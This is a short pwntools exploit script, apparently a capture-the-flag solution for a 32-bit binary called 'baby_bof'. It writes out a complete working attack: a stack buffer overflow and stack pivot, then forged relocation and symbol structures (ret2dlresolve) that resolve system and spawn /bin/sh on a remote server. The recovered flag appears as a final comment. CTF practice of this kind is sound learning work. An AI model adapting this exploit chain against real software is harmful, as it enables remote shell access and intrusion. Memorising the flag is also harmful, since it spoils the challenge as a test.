from pwn import *

local = 0

if local:
	s = process('./baby_bof')
	raw_input('DEBUG')
else:
	s = remote('45.122.249.68', 10007)

binary = ELF('baby_bof')
libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')

buf = 0x0804ca0c
dlresolve = 0x8049020
linkmap = 0x804c004
jmprel = 0x08048334
strtab = 0x804828c
symtab = 0x0804820c
leave_ret = 0x080490e5

payload = b'A' * 0x30 + p32(buf) + p32(binary.plt['read']) + p32(leave_ret) + p32(0) + p32(buf) + p32(200)

s.sendline(payload)

rel_offset = (buf + 24 - jmprel)
sym_offset = (buf + 32 - symtab) // 16
str_offset = buf + 48 - strtab
fake_rel = p32(binary.got['read']) + p32((sym_offset << 8) | 0x7)
fake_sym = p32(str_offset) + p32(0) + p32(0) + p32(0x12)
bin_sh = buf + 56

payload = b'A' * 4 + p32(dlresolve) + p32(rel_offset) + b'A' * 4 + p32(bin_sh) + b'A' * 4 + fake_rel
payload += fake_sym + b'system\x00\x00' + b'/bin/sh\x00'

s.sendline(payload)

s.interactive()	
#flag{tjnk_d4u_nku_ckj3c_r4nq_kk0n_l4m_mjnk_d4u}
